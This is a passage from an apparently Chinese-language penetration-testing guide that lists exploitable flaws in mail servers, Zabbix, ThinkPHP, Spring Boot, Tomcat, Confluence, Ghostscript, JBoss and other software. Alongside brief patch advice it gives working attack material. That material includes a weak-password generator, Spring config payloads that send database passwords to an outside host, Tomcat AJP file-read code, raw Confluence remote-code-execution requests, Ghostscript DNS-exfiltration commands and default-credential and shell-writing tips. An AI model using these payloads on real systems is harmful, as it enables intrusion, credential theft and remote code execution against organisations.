[&#39;&#39;.join(x) for x in list(itertools.product(prefix, [&#39;@&#39;, &#39;&#39;], [&#39;2019&#39;, &#39;2020&#39;, &#39;2018&#39;, &#39;123&#39;, &#39;1234&#39;, &#39;123456&#39;], [&#39;!&#39;, &#39;&#39;, &#39;.&#39;]))] : print(x)baidu@2019!baidu@2019baidu@2019.baidu@2020!baidu@2020.........Baidu123456Baidu123456.</code></pre><ol start="8"><li><p>防护方法</p></li><li><p>及时更新补丁</p></li><li><p>升级到最新版</p></li><li><p>做好权限控制</p><h1 id="Coremail-相关漏洞"><a href="#Coremail-相关漏洞" class="headerlink" title="Coremail 相关漏洞"></a>Coremail 相关漏洞</h1></li><li><p>漏洞简介<br>Coremail 是国内使用量很大的邮件服务商, 包括网易邮箱的后端使用的也是coremail</p></li><li><p>影响组件<br>Coremail</p></li><li><p>漏洞指纹<br>Coremail</p></li><li><p>Fofa Dork<br>app=”Coremail”</p></li><li><p>漏洞分析<br>Coremail-0day敏感文件泄露漏洞送附批量检测脚本_数据库_god_Zeo的博客-CSDN博客<br><a href="https://blog.csdn.net/god_zzZ/article/details/92735189">https://blog.csdn.net/god_zzZ/article/details/92735189</a></p></li><li><p>漏洞利用<br>yuxiaoyou123/coremail-exp<br><a href="https://github.com/yuxiaoyou123/coremail-exp">https://github.com/yuxiaoyou123/coremail-exp</a><br>dpu/coremail-address-book: Coremail邮件系统组织通讯录导出脚本<br><a href="https://github.com/dpu/coremail-address-book">https://github.com/dpu/coremail-address-book</a></p></li><li><p>利用技巧</p></li><li><p>这个找不到源码, 没法分析<br>里面的密码也多半没啥用, 还不如邮件里搜索一下vpn/密码</p></li><li><p>这个东西有几率受到ImageMagick影响(此处存疑, 我只在dnslog见过, 没有实锤)</p></li><li><p>防护方法</p></li><li><p>及时更新补丁</p></li><li><p>升级到最新版</p><h1 id="Winmail-相关漏洞"><a href="#Winmail-相关漏洞" class="headerlink" title="Winmail 相关漏洞"></a>Winmail 相关漏洞</h1></li><li><p>漏洞简介<br>Winmail 是国内使用量较大的邮件服务商, 由于版本老旧, 有一些历史漏洞, 注入, 任意文件下载, 上传</p></li><li><p>影响组件<br>Winmail</p></li><li><p>漏洞指纹<br>Winmail</p></li><li><p>Fofa Dork<br>app=”Winmail-Server”</p></li><li><p>漏洞分析<br>Winmail最新直达webshell 0day漏洞挖掘实录_91Ri.org<br><a href="http://www.91ri.org/16519.html">http://www.91ri.org/16519.html</a><br>winmail过滤不严getshell+任意文件下载(需要登录邮箱）_黑客技术<br><a href="http://www.hackdig.com/06/hack-36899.htm">http://www.hackdig.com/06/hack-36899.htm</a><br>Winmail普通用户可直接进入后台取得域名管理、用户管理等所有权限 | WooYun-2014-57890 | WooYun.org<br><a href="https://php.mengsec.com/bugs/wooyun-2014-057890.html">https://php.mengsec.com/bugs/wooyun-2014-057890.html</a></p></li><li><p>漏洞利用<br>Winmail最新直达webshell 0day漏洞挖掘实录_91Ri.org<br><a href="http://www.91ri.org/16519.html">http://www.91ri.org/16519.html</a><br>winmail过滤不严getshell+任意文件下载(需要登录邮箱）_黑客技术<br><a href="http://www.hackdig.com/06/hack-36899.htm">http://www.hackdig.com/06/hack-36899.htm</a><br>Winmail普通用户可直接进入后台取得域名管理、用户管理等所有权限 | WooYun-2014-57890 | WooYun.org<br><a href="https://php.mengsec.com/bugs/wooyun-2014-057890.html">https://php.mengsec.com/bugs/wooyun-2014-057890.html</a></p></li><li><p>利用技巧</p></li><li><p>这个邮箱很多高校在用, 通过分析补丁, 一些老版本没升级的话还是有问题, 最新版是6.5</p></li><li><p>邮件系列老洞<br>高屋建瓴之WebMail攻与防 – cyjay5un – 博客园<br><a href="https://www.cnblogs.com/cyjaysun/p/4378907.html">https://www.cnblogs.com/cyjaysun/p/4378907.html</a></p></li><li><p>防护方法</p></li><li><p>及时更新补丁</p></li><li><p>升级到最新版</p><h1 id="Zabbix-相关漏洞"><a href="#Zabbix-相关漏洞" class="headerlink" title="Zabbix 相关漏洞"></a>Zabbix 相关漏洞</h1></li><li><p>漏洞简介<br>Zabbix 由于监控着内网众多主机, 所以也是内网关注的重点, 主要是注入/弱口令/命令执行</p></li><li><p>影响组件<br>Zabbix</p></li><li><p>漏洞指纹<br>Zabbix</p></li><li><p>Fofa Dork<br>app=”Zabbix”</p></li><li><p>漏洞分析<br>记一次zabbix安装及漏洞利用getshell全过程 – 先知社区<br><a href="https://xz.aliyun.com/t/6874">https://xz.aliyun.com/t/6874</a><br>Zabbix 最新 SQL 注入漏洞及 EXP – Jamin Zhang<br><a href="https://jaminzhang.github.io/security/Zabbix-latest-SQL-Injection-Vulnerability-and-EXP/">https://jaminzhang.github.io/security/Zabbix-latest-SQL-Injection-Vulnerability-and-EXP/</a></p></li><li><p>漏洞利用<br>记一次zabbix安装及漏洞利用getshell全过程 – 先知社区<br><a href="https://xz.aliyun.com/t/6874">https://xz.aliyun.com/t/6874</a><br>Zabbix 最新 SQL 注入漏洞及 EXP – Jamin Zhang<br><a href="https://jaminzhang.github.io/security/Zabbix-latest-SQL-Injection-Vulnerability-and-EXP/">https://jaminzhang.github.io/security/Zabbix-latest-SQL-Injection-Vulnerability-and-EXP/</a></p></li><li><p>利用技巧</p></li><li><p>这里如果 Zabbix 附近遇到 Grafana, 一般都是默认口令 admin/admin, 进后台查看数据源的位置, 如果有 Zabbix , 直接 f12 查看密码, 就可以登录 Zabbix 了</p></li><li><p>另外 Grafana 后台sql查询处可以执行任意 sql, 其他数据源也一样见机行事</p></li><li><p>防护方法</p></li><li><p>设置强口令</p></li><li><p>尽量不要开放到公网</p></li><li><p>限制来源IP</p></li><li><p>升级到最新版</p><h1 id="边界产品-防火墙-网关-路由器-VPN-相关漏洞"><a href="#边界产品-防火墙-网关-路由器-VPN-相关漏洞" class="headerlink" title="边界产品(防火墙, 网关, 路由器, VPN) 相关漏洞"></a>边界产品(防火墙, 网关, 路由器, VPN) 相关漏洞</h1></li><li><p>漏洞简介<br>大型企业往往会配置一些边界设备来维护企业内外网通信, 这里也存在灯下黑的问题, 由于多数不开源, 漏洞主要以弱口令为主</p></li><li><p>影响组件<br>防火墙, 网关, 路由器, VPN</p></li><li><p>漏洞指纹<br>防火墙, 网关, 路由器, VPN</p></li><li><p>Fofa Dork<br>防火墙, 网关, 路由器, VPN 的名称</p></li><li><p>漏洞分析<br>【安全设备】常见网络安全设备默认口令|IT2021.Com<br><a href="https://www.it2021.com/security/614.html">https://www.it2021.com/security/614.html</a><br>渗透测试之各厂商防火墙登录IP、初始密码、技术支持<br><a href="https://mp.weixin.qq.com/s/OLf7QDl6qcsy2FOqCQ2icA">https://mp.weixin.qq.com/s/OLf7QDl6qcsy2FOqCQ2icA</a></p></li><li><p>漏洞利用<br>【安全设备】常见网络安全设备默认口令|IT2021.Com<br><a href="https://www.it2021.com/security/614.html">https://www.it2021.com/security/614.html</a><br>渗透测试之各厂商防火墙登录IP、初始密码、技术支持<br><a href="https://mp.weixin.qq.com/s/OLf7QDl6qcsy2FOqCQ2icA">https://mp.weixin.qq.com/s/OLf7QDl6qcsy2FOqCQ2icA</a></p></li><li><p>利用技巧</p></li><li><p>这个东西好多人不改默认口令, 就算改很多也是企业特色弱口令<br>admin root 123456 永远的神<br>内网的安全平台就是个漏洞指南</p></li><li><p>防护方法</p></li><li><p>设置强口令</p></li><li><p>限制来源IP</p><h1 id="第三节"><a href="#第三节" class="headerlink" title="第三节"></a>第三节</h1><p>本节主要是针对一些常见组件和中间件的相关漏洞(大部分是要结合环境利用), 这里肯定篇幅有限, 难免有所遗漏, 欢迎补充</p><h1 id="Thinkphp-相关漏洞"><a href="#Thinkphp-相关漏洞" class="headerlink" title="Thinkphp 相关漏洞"></a>Thinkphp 相关漏洞</h1></li><li><p>漏洞简介<br>Thinkphp 是国内很常见的PHP框架, 存在 远程代码执行/sql注入/反序列化/日志文件泄露等问题</p></li><li><p>影响组件<br>Thinkphp</p></li><li><p>漏洞指纹<br>Thinkphp<br>X-Powered-By: ThinkPHP</p></li><li><p>Fofa Dork<br>app=”ThinkPHP”</p></li><li><p>漏洞分析<br>ThinkPHP漏洞总结 – 赛克社区<br><a href="http://zone.secevery.com/article/1165">http://zone.secevery.com/article/1165</a><br>挖掘暗藏ThinkPHP中的反序列利用链 – 斗象能力中心<br><a href="https://blog.riskivy.com/%E6%8C%96%E6%8E%98%E6%9A%97%E8%97%8Fthinkphp%E4%B8%AD%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%88%A9%E7%94%A8%E9%93%BE/">https://blog.riskivy.com/%E6%8C%96%E6%8E%98%E6%9A%97%E8%97%8Fthinkphp%E4%B8%AD%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%88%A9%E7%94%A8%E9%93%BE/</a><br>ThinkPHP使用不当可能造成敏感信息泄露PHP_Fly鹏程万里-CSDN博客<br><a href="https://blog.csdn.net/Fly_hps/article/details/81201904">https://blog.csdn.net/Fly_hps/article/details/81201904</a><br>DSMall代码审计 – 安全客，安全资讯平台<br><a href="https://www.anquanke.com/post/id/203461">https://www.anquanke.com/post/id/203461</a></p></li><li><p>漏洞利用<br>SkyBlueEternal/thinkphp-RCE-POC-Collection: thinkphp v5.x 远程代码执行漏洞-POC集合<br><a href="https://github.com/SkyBlueEternal/thinkphp-RCE-POC-Collection">https://github.com/SkyBlueEternal/thinkphp-RCE-POC-Collection</a><br>Dido1960/thinkphp: thinkphp反序列化漏洞复现及POC编写<br><a href="https://github.com/Dido1960/thinkphp">https://github.com/Dido1960/thinkphp</a><br>whirlwind110/tphack: Thinkphp3/5 Log文件泄漏利用工具<br><a href="https://github.com/whirlwind110/tphack">https://github.com/whirlwind110/tphack</a></p></li><li><p>利用技巧</p></li><li><p>遇到Thinkphp的站点看一下版本, 或者直接扫一下, 看看有没有rce, 或者日志文件泄露</p></li><li><p>自从我挖了thinphp的反序列化利用链以后, 这类型考题经常出没在ctf中</p></li><li><p>实战中也看到偶尔有可以利用的情况, 运气好可能有惊喜, 刚好有篇新出的文章中使用到了这个漏洞<br>DSMall代码审计 – 安全客，安全资讯平台<br><a href="https://www.anquanke.com/post/id/203461">https://www.anquanke.com/post/id/203461</a></p></li><li><p>防护方法</p></li><li><p>及时更新补丁</p></li><li><p>升级到最新版Thinkphp</p></li><li><p>前置WAF进行防护</p><h1 id="Spring-系列漏洞"><a href="#Spring-系列漏洞" class="headerlink" title="Spring 系列漏洞"></a>Spring 系列漏洞</h1></li><li><p>漏洞简介<br>Spring 是java web里最最最最常见的组件了, 自然也是研究的热门, 好用的漏洞主要是Spring Boot Actuators 反序列化, 火起来之前用了一两年, 效果很棒</p></li><li><p>影响组件<br>Spring xxx</p></li><li><p>漏洞指纹<br>X-Application-Context:</p></li><li><p>Fofa Dork<br>app=”Spring-Framework”</p></li><li><p>漏洞分析<br>Spring 框架漏洞集合 ~ Misaki’s Blog<br><a href="https://misakikata.github.io/2020/04/Spring-%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/">https://misakikata.github.io/2020/04/Spring-%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/</a><br>Exploiting Spring Boot Actuators | Veracode blog<br><a href="https://www.veracode.com/blog/research/exploiting-spring-boot-actuators">https://www.veracode.com/blog/research/exploiting-spring-boot-actuators</a><br>Spring Boot Actuators配置不当导致RCE漏洞复现 – JF ‘ blog<br><a href="https://jianfensec.com/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Spring%20Boot%20Actuators%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93%E5%AF%BC%E8%87%B4RCE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">https://jianfensec.com/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Spring%20Boot%20Actuators%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93%E5%AF%BC%E8%87%B4RCE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</a></p></li><li><p>漏洞利用<br>mpgn/Spring-Boot-Actuator-Exploit: Spring Boot Actuator (jolokia) XXE/RCE<br><a href="https://github.com/mpgn/Spring-Boot-Actuator-Exploit">https://github.com/mpgn/Spring-Boot-Actuator-Exploit</a><br>artsploit/yaml-payload: A tiny project for generating SnakeYAML deserialization payloads<br><a href="https://github.com/artsploit/yaml-payload">https://github.com/artsploit/yaml-payload</a></p></li><li><p>利用技巧</p></li><li><p>Spring Boot Actuators 相关漏洞超级好用<br>很多厂商一开始都不懂, 直接对外开放Spring Boot Actuators, 造成了有一段时间每个用了Spring Boot的厂商都出了问题<br>尤其是现在很多厂商使用微服务框架, 通过网关进行路由分发, 一些子目录通常对应一个Spring Boot启动的服务<br>然后子目录比如 <a href="http://123.123.123.123/admin/env">http://123.123.123.123/admin/env</a> , <a href="http://123.123.123.123/manager/env%E4%B9%9F%E9%83%BD%E6%98%AF%E5%8F%AF%E4%BB%A5%E5%87%BA%E7%8E%B0%E7%9A%84">http://123.123.123.123/manager/env也都是可以出现的</a><br>/env 可以偷session, RCE<br>/heapdump 可以直接dump jvm中的对象, 使用 jhat 可以读取里面的对象<br>可以遍历如下的endpoint, 1.x 2.x的目录不一样, 所以都覆盖了一下</p></li></ol><pre><code>/trace/health/loggers/metrics/autoconfig/heapdump/threaddump/env/info/dump/configprops/mappings/auditevents/beans/jolokia/cloudfoundryapplication/hystrix.stream/actuator/actuator/auditevents/actuator/beans/actuator/health/actuator/conditions/actuator/configprops/actuator/env/actuator/info/actuator/loggers/actuator/heapdump/actuator/threaddump/actuator/metrics/actuator/scheduledtasks/actuator/httptrace/actuator/mappings/actuator/jolokia/actuator/hystrix.stream/monitor/monitor/auditevents/monitor/beans/monitor/health/monitor/conditions/monitor/configprops/monitor/env/monitor/info/monitor/loggers/monitor/heapdump/monitor/threaddump/monitor/metrics/monitor/scheduledtasks/monitor/httptrace/monitor/mappings/monitor/jolokia/monitor/hystrix.stream</code></pre><p>这里通过 /env + /refresh 进行rce应该还有其他利用手法, 当spring boot reload的时候会进行一些默认操作<br>里面就有操作空间, 很像fastjson反序列化<br>2.就算实在不能RCE, 这里也有个技巧可以偷取 Spring 配置文件中的加密字段, 偷一下生产环境的密码/key也ok<br>eureka.client.serviceUrl.defaultZone=http://${somedb.password}@127.0.0.1:5000<br>spring.cloud.bootstrap.location=http://${somedb.password}@artsploit.com/yaml-payload.yml<br>3.尤其是使用spring eureka做集群的时候, 通常拿到一台服务器, 就可以传递恶意注册到其他server, 从而感染整个微服务集群<br>eureka 通常是 server 也是 client, 无论对方请求什么都直接返回恶意序列化xml就可以了<br>8. 防护方法<br>1.及时更新补丁<br>2.开启Spring Boot Actuators权限校验<br>3.前置WAF进行防护</p><h1 id="Phpstudy-后门远程代码执行"><a href="#Phpstudy-后门远程代码执行" class="headerlink" title="Phpstudy 后门远程代码执行"></a>Phpstudy 后门远程代码执行</h1><ol><li><p>漏洞简介<br>Phpstudy 是一个国产的php快速集成环境, 主要用于学习测试, 但是也有很多人直接拿来部署服务器</p></li><li><p>影响组件<br>Phpstudy</p></li><li><p>漏洞指纹<br>phpStudy 探针</p></li><li><p>Fofa Dork<br>app=”phpStudy 探针”</p></li><li><p>漏洞分析<br>PhpStudy 后门分析<br><a href="https://paper.seebug.org/1044/">https://paper.seebug.org/1044/</a></p></li><li><p>漏洞利用<br>NS-Sp4ce/PHPStudy_BackDoor_Exp: PHPStudy_BackDoor_EXP PHPstudy后门利用脚本<br><a href="https://github.com/NS-Sp4ce/PHPStudy_BackDoor_Exp">https://github.com/NS-Sp4ce/PHPStudy_BackDoor_Exp</a></p></li><li><p>利用技巧</p></li><li><p>phpstudy 根目录下面有个l.php , 里面有探针, 可以作为判断条件</p></li><li><p>还有个/phpmyadmin目录, 一般密码都是root/root 后台mysql outfile 写 shell 就ok了</p></li><li><p>防护方法</p></li><li><p>及时删除phpstudy</p></li><li><p>升级到最新版</p></li><li><p>不要用phpstduy搭建生产环境</p><h1 id="Struts-系列漏洞"><a href="#Struts-系列漏洞" class="headerlink" title="Struts 系列漏洞"></a>Struts 系列漏洞</h1></li><li><p>漏洞简介<br>Struts 真的是Java漏洞史上浓墨重彩的一笔, 堪称那些年的漏洞之王, 一直到现在还没有消失, 企业内网还是有不少存在</p></li><li><p>影响组件<br>Struts</p></li><li><p>漏洞指纹<br>Struts<br>.action<br>.do<br>.action!xxxx<br>struts2_check/struts2_hunt_v2.py at master · coffeehb/struts2_check<br><a href="https://github.com/coffeehb/struts2_check/">https://github.com/coffeehb/struts2_check/</a></p></li><li><p>Fofa Dork<br>app=”Struts2” (这个不太准)</p></li><li><p>漏洞分析<br>Struts2代码执行漏洞整理 – 简书<br><a href="https://www.jianshu.com/p/d7cd8a2a992b">https://www.jianshu.com/p/d7cd8a2a992b</a></p></li><li><p>漏洞利用<br>struts-scan/struts-scan.py at master · Lucifer1993/struts-scan<br><a href="https://github.com/Lucifer1993/struts-scan/">https://github.com/Lucifer1993/struts-scan/</a></p></li><li><p>利用技巧</p></li><li><p>Struts 的漏洞(比如016, 032)经常可以用于ssrf打内网, 说不好就有惊喜</p></li><li><p>防护方法</p></li><li><p>升级到最新版</p></li><li><p>不建议使用Struts</p><h1 id="Solr-系列漏洞"><a href="#Solr-系列漏洞" class="headerlink" title="Solr 系列漏洞"></a>Solr 系列漏洞</h1></li><li><p>漏洞简介<br>Solr 是企业常见的全文搜索服务, 这两年也爆出很多安全漏洞,</p></li><li><p>影响组件<br>Solr</p></li><li><p>漏洞指纹<br>Solr</p></li><li><p>Fofa Dork<br>app=”Solr”</p></li><li><p>漏洞分析<br>Apache Solr最新RCE漏洞分析 – FreeBuf互联网安全新媒体平台<br><a href="https://www.freebuf.com/vuls/218730.html">https://www.freebuf.com/vuls/218730.html</a><br>Apache Solr DataImportHandler 远程代码执行漏洞(CVE-2019-0193) 分析<br><a href="https://paper.seebug.org/1009/">https://paper.seebug.org/1009/</a></p></li><li><p>漏洞利用<br>veracode-research/solr-injection: Apache Solr Injection Research<br><a href="https://github.com/veracode-research/solr-injection">https://github.com/veracode-research/solr-injection</a><br>jas502n/CVE-2019-12409: Apache Solr RCE (ENABLE_REMOTE_JMX_OPTS=”true”)<br><a href="https://github.com/jas502n/CVE-2019-12409">https://github.com/jas502n/CVE-2019-12409</a><br>mogwailabs/mjet: MOGWAI LABS JMX exploitation toolkit<br><a href="https://github.com/mogwailabs/mjet">https://github.com/mogwailabs/mjet</a></p></li><li><p>利用技巧</p></li><li><p>看到锤就完事了, 漏洞太多了, 一片一片的</p></li><li><p>遇到mjet连接超时, 这是目标服务起返回了错误的stub(内网地址, 常见于docker), 可以使用socat进行流量转发, 后记里面有具体操作</p></li><li><p>防护方法</p></li><li><p>升级到最新版</p></li><li><p>不要对外开放敏感端口</p><h1 id="Tomcat-本地文件包含漏洞-CVE-2020-1938"><a href="#Tomcat-本地文件包含漏洞-CVE-2020-1938" class="headerlink" title="Tomcat 本地文件包含漏洞 (CVE-2020-1938)"></a>Tomcat 本地文件包含漏洞 (CVE-2020-1938)</h1></li><li><p>漏洞简介<br>Tomcat 是常见的Web 容器, 用户量非常巨大, Tomcat 8009 ajp端口一直是默认开放的, 这个漏洞存在很多年了, 这次应该有奇效</p></li><li><p>影响组件<br>Apache Tomcat 6<br>Apache Tomcat 7 &lt; 7.0.100<br>Apache Tomcat 8 &lt; 8.5.51<br>Apache Tomcat 9 &lt; 9.0.31</p></li><li><p>漏洞指纹<br>tomcat<br>8009<br>ajp<br>\x04\x01\xf4\x00\x15</p></li><li><p>Fofa Dork<br>protocol=”ajp”</p></li><li><p>漏洞分析<br>Apache Tomcat AJP协议文件包含漏洞分析 – 斗象能力中心<br><a href="https://blog.riskivy.com/apache-tomcat-ajp%e5%8d%8f%e8%ae%ae%e6%96%87%e4%bb%b6%e5%8c%85%e5%90%ab%e6%bc%8f%e6%b4%9e%e5%88%86%e6%9e%90/">https://blog.riskivy.com/apache-tomcat-ajp%e5%8d%8f%e8%ae%ae%e6%96%87%e4%bb%b6%e5%8c%85%e5%90%ab%e6%bc%8f%e6%b4%9e%e5%88%86%e6%9e%90/</a></p></li><li><p>漏洞利用<br>0nise/CVE-2020-1938: CVE-2020-1938<br><a href="https://github.com/0nise/CVE-2020-1938">https://github.com/0nise/CVE-2020-1938</a></p></li><li><p>利用技巧</p></li><li><p>当时还没公开poc的时候就分析出来exp挺有意思的, 效果确实还可以, 当天fofa都被累挂了<br>主要代码也就这</p></li></ol><pre><code>t = Tomcat(&quot;127.0.0.1&quot;, 8009)_, data = t.perform_request(&#39;/&#39;, attributes=[    &#123;&#39;name&#39;: &#39;req_attribute&#39;, &#39;value&#39;: [&#39;javax.servlet.include.request_uri&#39;, &#39;/&#39;]&#125;,     &#123;&#39;name&#39;: &#39;req_attribute&#39;, &#39;value&#39;: [&#39;javax.servlet.include.path_info&#39;, &quot;/WEB-INF/web.xml&quot;]&#125;,     &#123;&#39;name&#39;: &#39;req_attribute&#39;, &#39;value&#39;: [&#39;javax.servlet.include.servlet_path&#39;, &#39;/&#39;]&#125;, ])print(&#39;----------------------------&#39;)print(&quot;&quot;.join([bytes.decode(d.data) for d in data]))</code></pre><p>2.通过修改这里的路径可以进行Webapp切换, 默认是ROOT/, 需要切换应用就改成 /admin/ 之类的<br>3.通常检测的时候, 尽量保持t.perform_request(‘/‘ , 有的poc喜欢用 /addsd 这种的不存在的路径, 有些情况会读不到文件<br>8. 防护方法<br>1.升级到最新版<br>2.屏蔽8009端口对外开放</p><h1 id="PHP-FPM-远程代码执行漏洞"><a href="#PHP-FPM-远程代码执行漏洞" class="headerlink" title="PHP-FPM 远程代码执行漏洞"></a>PHP-FPM 远程代码执行漏洞</h1><ol><li><p>漏洞简介<br>国外安全研究员 Andrew Danau在解决一道 CTF 题目时发现, 向目标服务器 URL 发送 %0a 符号时, 服务返回异常, 疑似存在漏洞<br>2019年10月23日, github公开漏洞相关的详情以及exp.当nginx配置不当时, 会导致php-fpm远程任意代码执行</p></li><li><p>影响组件<br>Nginx + FPM + PHP7</p></li><li><p>漏洞指纹<br>Nginx<br>PHP<br>nextcloud</p></li><li><p>Fofa Dork</p></li><li><p>漏洞分析<br>PHP-fpm 远程代码执行漏洞(CVE-2019-11043)分析<br><a href="https://paper.seebug.org/1063/">https://paper.seebug.org/1063/</a></p></li><li><p>漏洞利用<br>neex/phuip-fpizdam: Exploit for CVE-2019-11043<br><a href="https://github.com/neex/phuip-fpizdam">https://github.com/neex/phuip-fpizdam</a><br>jas502n/CVE-2019-11043: php-fpm+Nginx RCE<br><a href="https://github.com/jas502n/CVE-2019-11043">https://github.com/jas502n/CVE-2019-11043</a></p></li><li><p>利用技巧</p></li><li><p>这个漏洞检测没有特别稳定的方案, 目前可以参考k8的检测方案, 通过递增发送payload检测服务器502<br>k8gege/CVE-2019-11043: Ladon POC Moudle CVE-2019-11043 (PHP-FPM + Ngnix)<br><a href="https://github.com/k8gege/CVE-2019-11043">https://github.com/k8gege/CVE-2019-11043</a></p></li><li><p>Nextcloud 这个应用的默认配置就存在漏洞</p></li><li><p>防护方法</p></li><li><p>升级到最新版php</p></li><li><p>修改nginx配置</p><h1 id="CVE-2019-3396-Confluence-Wiki-远程代码执行"><a href="#CVE-2019-3396-Confluence-Wiki-远程代码执行" class="headerlink" title="CVE-2019-3396 Confluence Wiki 远程代码执行"></a>CVE-2019-3396 Confluence Wiki 远程代码执行</h1></li><li><p>漏洞简介<br>Confluence Wiki 是企业常用的 Wiki 平台, 其媒体插件存在一处远程代码执行</p></li><li><p>影响组件<br>Confluence</p></li><li><p>漏洞指纹<br>Confluence</p></li><li><p>Fofa Dork<br>app=”Confluence”</p></li><li><p>漏洞分析<br>Confluence 未授权 RCE (CVE-2019-3396) 漏洞分析<br><a href="https://paper.seebug.org/884/">https://paper.seebug.org/884/</a><br>Atlassian Confluence 远程代码执行漏洞分析 – 斗象能力中心<br>Atlassian Confluence 远程代码执行漏洞分析</p></li><li><p>漏洞利用<br>jas502n/CVE-2019-3396: Confluence 未授权 RCE (CVE-2019-3396) 漏洞<br><a href="https://github.com/jas502n/CVE-2019-3396">https://github.com/jas502n/CVE-2019-3396</a></p></li><li><p>利用技巧</p></li></ol><p>1.本地写日志的方式getshell</p><p>这个漏洞挺有意思的, 在国内没公开的时候, 我们就监测到了, 然后也写出了exp, 奈何没几天就曝光了</p><p>这里的远程模板加载不支持http协议, 主要是classloader的问题, 不然应该更早挖出来, 这里还有一种本地写日志的方式getshell</p><p>这是一个从来没有人关注的默认开放的8091端口, 部分低版本支持file协议可以getshell, 适用于不出网的情况, 这个poc不是特别稳定, 因为日志中有不可控的字符</p><p>velocity比php语法要相对严格一点, 可能会报错, 而且velocity渲染的时候, 目标文件不能太大, 但是极端情况可以试一下</p><pre><code>GET /synchrony/heartbeat HTTP/1.1Host: localhost:8091User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:66.0) Gecko/20100101 Firefox/66.0Accept: text/html, */*; q=0.01Accept-Language: en-US, en;q=0.5Referer: http://localhost:8091Connection: closex-forwarded-for: $i18n.getClass().forName(&#39;java.lang.Runtime&#39;).getMethod(&#39;getRuntime&#39;, null).invoke(null, null).exec(&#39;gnome-calculator&#39;).waitFor()POST /rest/tinymce/1/macro/preview HTTP/1.1Host: localhost:8090User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:66.0) Gecko/20100101 Firefox/66.0Accept: text/html, */*; q=0.01Accept-Language: en-US, en;q=0.5Referer: http://localhost:8090/Content-Type: application/json; charset=utf-8X-Requested-With: XMLHttpRequestContent-Length: 258Connection: close&#123;&quot;contentId&quot;:&quot;65594&quot;, &quot;macro&quot;:&#123;&quot;name&quot;:&quot;widget&quot;, &quot;body&quot;:&quot;&quot;, &quot;params&quot;:&#123;&quot;url&quot;:&quot;http://www.dailymotion.com/video/xcpa64?_template=/etc/passwd&quot;, &quot;width&quot;:&quot;300&quot;, &quot;height&quot;:&quot;200&quot;, &quot;_template&quot;:&quot;file:/var/atlassian/application-data/confluence/logs/atlassian-synchrony.log&quot;&#125;&#125;&#125;</code></pre><ol start="8"><li><p>防护方法</p></li><li><p>升级到最新版</p></li><li><p>尽量不要开放到公网</p></li><li><p>限制来源IP</p><h1 id="Ghostscript-上传图片代码执行"><a href="#Ghostscript-上传图片代码执行" class="headerlink" title="Ghostscript 上传图片代码执行"></a>Ghostscript 上传图片代码执行</h1></li><li><p>漏洞简介<br>Ghostscript 是图像处理中十分常用的库, 集成在imagemagick等多个开源组件中, 其 .ps文件存在沙箱绕过导致代码执行的问题影响广泛, 由于上传图片就有可能代码执行, 很多大厂中招</p></li><li><p>影响组件<br>imagemagick, libmagick, graphicsmagick, gimp, python-matplotlib, texlive-core, texmacs, latex2html, latex2rtf 等图像处理应用</p></li><li><p>漏洞指纹<br>.ps/.webp/.webp</p></li><li><p>Fofa Dork</p></li><li><p>漏洞分析<br>ghostscript命令执行漏洞预警 – 安全客, 安全资讯平台<br><a href="https://www.anquanke.com/post/id/157513">https://www.anquanke.com/post/id/157513</a></p></li><li><p>漏洞利用<br>Exploit Database Search<br><a href="https://www.exploit-db.com/search?q=Ghostscript">https://www.exploit-db.com/search?q=Ghostscript</a><br>vulhub/ghostscript/CVE-2019-6116 at master · vulhub/vulhub<br><a href="https://github.com/vulhub/vulhub/tree/master/ghostscript/CVE-2019-6116">https://github.com/vulhub/vulhub/tree/master/ghostscript/CVE-2019-6116</a></p></li><li><p>利用技巧</p></li><li><p>如果发现网站可以上传图片, 且图片没有经过裁剪, 最后返回缩略图, 这里就可能存在Ghostscript 上传图片代码执行<br>dnslog 可以用 ping <code>uname</code>.admin.ceye.io 或 ping <code>whoami</code>.admin.ceye.io<br>保存成图片, 以后用起来方便, 有个版本的 centos 和 ubuntu poc还不一样, 可以这样构造<br>ping <code>whoami</code>.centos.admin.ceye.io / ping <code>whoami</code>.ubuntu.admin.ceye.io<br>分别命名为 centos_ps.webp/ubuntu_ps.webp, 这样测试的时候直接传2个文件, 通过DNSLOG可以区分是哪个poc执行的</p></li><li><p>防护方法</p></li><li><p>升级到最新版</p><h1 id="Jboss-相关漏洞"><a href="#Jboss-相关漏洞" class="headerlink" title="Jboss 相关漏洞"></a>Jboss 相关漏洞</h1></li><li><p>漏洞简介<br>JBoss是一个基于J2EE的开放源代码应用服务器, 用户数量较大, 一些版本受到反序列化等漏洞影响</p></li><li><p>影响组件<br>Jboss</p></li><li><p>漏洞指纹<br>Jboss</p></li><li><p>Fofa Dork<br>app=”JBoss”</p></li><li><p>漏洞分析<br>打开JBoss的潘多拉魔盒:JBoss高危漏洞分析 – FreeBuf互联网安全新媒体平台<br><a href="https://www.freebuf.com/vuls/186948.html">https://www.freebuf.com/vuls/186948.html</a></p></li><li><p>漏洞利用<br>joaomatosf/jexboss: JexBoss: Jboss (and Java Deserialization Vulnerabilities) verify and EXploitation Tool<br><a href="https://github.com/joaomatosf/jexboss">https://github.com/joaomatosf/jexboss</a><br>Perun/vuln/jboss at master · WyAtu/Perun<br><a href="https://github.com/WyAtu/Perun/tree/master/vuln/jboss">https://github.com/WyAtu/Perun/tree/master/vuln/jboss</a></p></li><li><p>利用技巧</p></li><li><p>Jboss的漏洞在内网还是相对比较常见的, 试过几次jexboss, 效果还ok</p></li><li><p>防护方法</p></li><li><p>设置强口令</p></li><li><p>尽量不要开放到公网</p></li><li><p>限制来源IP</p></li><li><p>升级到最新版</p><h1 id="Websphere-反序列化远程代码执行"><a href="#Websphere-反序列化远程代码执行" class="headerlink" title="Websphere 反序列化远程代码执行"></a>Websphere 